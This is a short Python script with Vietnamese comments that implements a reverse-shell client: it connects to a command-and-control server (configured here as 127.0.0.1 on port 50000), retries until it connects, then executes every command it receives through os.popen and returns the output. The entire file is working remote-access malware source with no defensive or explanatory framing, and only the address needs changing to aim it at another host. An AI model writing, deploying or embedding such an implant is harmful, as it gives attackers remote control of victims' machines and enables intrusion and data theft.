import socket
import time
import os

def shell():
    while True:
        # Ví dụ cho phép thực thi lệnh nhận từ server
        command = sock.recv(1024).decode()
        if command.lower() == "exit":
            break
        if command.startswith("cd"):
            try:
                os.chdir(command[3:])
                sock.send(f"Đã chuyển sang {os.getcwd()}".encode())
            except FileNotFoundError as e:
                sock.send(f"Lỗi: {str(e)}".encode())
        else:
            output = os.popen(command).read()
            if output:
                sock.send(output.encode())
            else:
                sock.send(b"NO\n")

ServIP = "127.0.0.1"  # Địa chỉ IP của C2
ServPort = 50000      # Cổng C2

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        sock.connect((ServIP, ServPort))
        print(f"Kết nối đến C2: {ServIP}:{ServPort}")
        break
    except socket.error:
        print("Kết nối thất bại, thử lại sau 1 giây...")
        time.sleep(1)

shell()
sock.close()
